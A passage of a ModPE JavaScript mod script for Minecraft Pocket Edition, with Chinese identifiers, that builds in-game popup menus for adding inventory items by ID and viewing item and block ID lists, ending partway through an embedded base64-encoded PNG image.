                                button.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.BOTTOM, 0, 屏幕高度 / 3);
                            } catch (err) {
                                print(err)
                            }
                        }
                    }))



                    function dip2px(ctx, dips) {
                        return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
                    }


                    function makeMenu(ctx, layout) {
                        var mlayout = new android.widget.RelativeLayout(ctx)
                        var svParams = new android.widget.RelativeLayout.LayoutParams(android.widget.RelativeLayout.LayoutParams.FILL_PARENT, android.widget.RelativeLayout.LayoutParams.FILL_PARENT)
                        var scrollview = new android.widget.ScrollView(ctx)
                        var pad = dip2px(ctx, 2)
                        scrollview.setPadding(pad, pad, pad, pad)
                        scrollview.setLayoutParams(svParams)
                        scrollview.addView(layout)
                        mlayout.addView(scrollview)
                        return mlayout
                    }




                }
            }))
            layout.addView(vb)


            var mlayout = makeMenu(ctx, layout)
            menu.setContentView(mlayout)
            menu.setWidth(dip2px(ctx, 150))
            menu.setHeight(dip2px(ctx, 350))
            menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 0, 0)))
            menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 150), dip2px(ctx, 0))
        } catch (err) {
            print(err)
        }
    }
    /*感谢欣欣如灬提供本函数*/

function 添加物品() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    ctx.runOnUiThread(new java.lang.Runnable({
        run: function() {
            try {
                添加物()
            } catch (err) {
                print(err)
            }
        }
    }))

    function 添加物() {
        var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
        var layout = new android.widget.LinearLayout(ctx)
        try {
            var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
            menu.setFocusable(true)
            var layout = new android.widget.LinearLayout(ctx)
            layout.setOrientation(1)
            var 物品ID = new android.widget.EditText(ctx)
            物品ID.setText("")
            物品ID.setHint("物品ID")
            layout.addView(物品ID)

            var 物品特殊值 = new android.widget.EditText(ctx)
            物品特殊值.setText("")
            物品特殊值.setHint("物品特殊值")
            layout.addView(物品特殊值)

            var 确认 = new android.widget.Button(ctx)
            确认.setText("确认")
            确认.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    var 特殊值 = 物品特殊值.getText()
                    var ID = 物品ID.getText()
                    addItemInventory(ID, 1, 特殊值)
                    clientMessage("已添加")
                    var va = new android.widget.TextView(ctx)
                    va.setText("  by皇家圣火迪莫  ")
                    va.setTextSize(20)
                    layout.addView(va)

                }
            }))
            layout.addView(确认)
            var vb = new android.widget.Button(ctx)
            vb.setText("物品ID一览表")
            vb.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
                    var GUI;
                    ctx.runOnUiThread(new java.lang.Runnable({
                        run: function() {
                            try {
                                var layout2 = new android.widget.LinearLayout(ctx);
                                layout2.setOrientation(1);
                                var scroll2 = new android.widget.ScrollView(ctx);
                                scroll2.addView(layout2);
                                var txt = new android.widget.TextView(ctx);
                                var dialog = new android.app.Dialog(ctx);
                                dialog.setContentView(scroll2);
                                dialog.setTitle("重要说明,请看完");
                                layout2.addView(txt); //txt
                                txt.setText(物品ID一览表);
                                var zuang = new android.widget.Button(ctx);
                                zuang.setOnClickListener(new android.view.View.OnClickListener() {
                                    onClick: function(viewarg) {
                                        dialog.dismiss()
                                    }
                                });
                                zuang.setText("知道了");
                                layout2.addView(zuang)
                                dialog.show();
                            } catch (err) {
                                print("Err: " + err);
                            }
                        }
                    }));
                }
            }))
            layout.addView(vb)

            var vb = new android.widget.Button(ctx)
            vb.setText("方块ID一览表")
            vb.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
                    var GUI;
                    ctx.runOnUiThread(new java.lang.Runnable({
                        run: function() {
                            try {
                                var layout2 = new android.widget.LinearLayout(ctx);
                                layout2.setOrientation(1);
                                var scroll2 = new android.widget.ScrollView(ctx);
                                scroll2.addView(layout2);
                                var txt = new android.widget.TextView(ctx);
                                var dialog = new android.app.Dialog(ctx);
                                dialog.setContentView(scroll2);
                                dialog.setTitle("重要说明,请看完");
                                layout2.addView(txt); //txt
                                txt.setText(方块ID一览表);
                                var zuang = new android.widget.Button(ctx);
                                zuang.setOnClickListener(new android.view.View.OnClickListener() {
                                    onClick: function(viewarg) {
                                        dialog.dismiss()
                                    }
                                });
                                zuang.setText("知道了");
                                layout2.addView(zuang)
                                dialog.show();
                            } catch (err) {
                                print("Err: " + err);
                            }
                        }
                    }));
                }
            }))
            layout.addView(vb)

            var mlayout = makeMenu(ctx, layout)
            menu.setContentView(mlayout)
            menu.setWidth(dip2px(ctx, 200))
            menu.setHeight(dip2px(ctx, 200))
            menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
            menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT | android.view.Gravity.TOP, dip2px(ctx, 10), dip2px(ctx, 10))
        } catch (err) {
            print(err)
        }
    }


    function dip2px(ctx, dips) {
        return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
    }


    function makeMenu(ctx, layout) {
        var mlayout = new android.widget.RelativeLayout(ctx)
        var svParams = new android.widget.RelativeLayout.LayoutParams(android.widget.RelativeLayout.LayoutParams.FILL_PARENT, android.widget.RelativeLayout.LayoutParams.FILL_PARENT)
        var scrollview = new android.widget.ScrollView(ctx)
        var pad = dip2px(ctx, 2)
        scrollview.setPadding(pad, pad, pad, pad)
        scrollview.setLayoutParams(svParams)
        scrollview.addView(layout)
        mlayout.addView(scrollview)
        return mlayout
    }
}




var 修复模式 = false
    //如果反复出现黑屏和闪退以及报错,请开启.
    //开启: true | 关闭: false

//禁止抄袭和恶意篡改
//百度贴吧@Pvzlight制作


调试输出("开始加载");
iVBORw0KGLG = "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